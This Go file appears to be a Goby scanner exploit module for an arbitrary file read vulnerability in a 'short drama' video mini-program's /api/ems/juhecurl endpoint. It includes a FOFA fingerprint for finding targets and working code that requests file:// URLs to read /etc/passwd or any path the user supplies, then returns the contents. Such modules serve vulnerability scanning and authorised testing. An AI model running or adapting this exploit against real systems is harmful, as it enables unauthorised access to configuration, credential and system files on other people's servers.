package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Short drama film and television applet front-end /api/ems/juhecurl File Read Vulnerability",
    "Description": "<p>The latest new version of the small theater short drama film and television applet source code + hot project in 2024, the short drama app applet, is connected to Yifuzhi. There is a Curl_exec function in the juhecurl method in the /api/controller/Ems.php controller, and the parameters are controllable, resulting in arbitrary file reading in the foreground.</p>",
    "Product": "Short drama film and television applet front desk",
    "Homepage": "https://www.xiaomaw.cn/3188.html",
    "DisclosureDate": "2024-09-02",
    "PostTime": "2024-10-15",
    "Author": "1251220046@qq.com",
    "FofaQuery": "body=\"/VwmRIfEYDH.php\"&& body=\"navbar-brand page-scroll\"",
    "GobyQuery": "body=\"/VwmRIfEYDH.php\"&& body=\"navbar-brand page-scroll\"",
    "Level": "0",
    "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. You can set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/%E7%9F%AD%E5%89%A7%E5%BD%B1%E8%A7%86%E5%B0%8F%E7%A8%8B%E5%BA%8F/%E7%9F%AD%E5%89%A7%E5%BD%B1%E8%A7%86%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%89%8D%E5%8F%B0juhecurl%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "passwd,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "4.5",
    "Translation": {
        "CN": {
            "Name": "短剧影视小程序前台 /api/ems/juhecurl 文件读取漏洞",
            "Product": "短剧影视小程序前台",
            "Description": "<p>2024年最新新版小剧场短剧影视小程序源码+风口项目 ，短剧app 小程序，对接了易支付，在/api/controller/Ems.php 控制器中的 juhecurl 方法存在Curl_exec函数，并且传参可控，导致前台任意文件读取。<br><br></p>",
            "Recommendation": "<p>1、可通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要⽂件（如数据库配置⽂件、系统配置⽂件）、数据库配置⽂件等等，导致⽹站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Short drama film and television applet front-end /api/ems/juhecurl File Read Vulnerability",
            "Product": "Short drama film and television applet front desk",
            "Description": "<p>The latest new version of the small theater short drama film and television applet source code + hot project in 2024, the short drama app applet, is connected to Yifuzhi. There is a Curl_exec function in the juhecurl method in the /api/controller/Ems.php controller, and the parameters are controllable, resulting in arbitrary file reading in the foreground.<br></p>",
            "Recommendation": "<p>1. You can set access policies and whitelist access through security devices such as firewalls.<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9961"
}`

	postOrGet_jwe1MsT7 := func(hostInfo *httpclient.FixUrl, filePath string) (string, error) {
		respTxt := ""
		URLPath := "/api/ems/juhecurl?url=file://"
		getRequestConfig := httpclient.NewGetRequestConfig(URLPath + filePath)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		//请求
		response, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)

		if err != nil || response == nil {
			return "", err
		}
		respTxt = response.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/api/ems/juhecurl?url=file:///etc/passwd"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/etc/passwd": "root:",
			}
			// 函数继承
			fileReadFunc := postOrGet_jwe1MsT7

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for filePath, fileText := range defaultModeMap {
				resp, err := fileReadFunc(u, filePath)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"passwd": {"/etc/passwd", "root"},
			}
			// 此处需要修改：函数继承
			fileReadFunc := postOrGet_jwe1MsT7

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := fileReadFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
